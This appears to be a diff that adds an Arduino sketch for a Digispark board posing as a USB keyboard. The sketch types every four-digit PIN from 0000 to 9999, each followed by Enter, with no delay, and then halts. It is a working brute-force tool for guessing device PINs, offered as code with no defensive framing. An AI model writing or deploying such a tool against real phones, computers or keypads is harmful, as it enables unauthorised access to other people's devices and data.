@@ -1,0 +1,24 @@
+/*  Digispark rubber-ducky – no delay() whatsoever
+    0000[ENTER] … 9999[ENTER]  @ full USB speed
+*/
+#include "DigiKeyboard.h"
+
+void setup() {
+  pinMode(1, OUTPUT);
+  digitalWrite(1, LOW);
+  DigiKeyboard.update();
+  DigiKeyboard.sendKeyStroke(0);   // release all
+  /* 2-second bootloader already elapsed; no extra wait here */
+}
+
+void loop() {
+  for (int num = 0; num <= 9999; ++num) {
+    if (num < 10)        DigiKeyboard.print("000");
+    else if (num < 100)  DigiKeyboard.print("00");
+    else if (num < 1000) DigiKeyboard.print("0");
+    DigiKeyboard.print(num);
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);   // ENTER after every number
+  }
+  digitalWrite(1, HIGH);   // done
+  for (;;) {}              // hang forever
+}
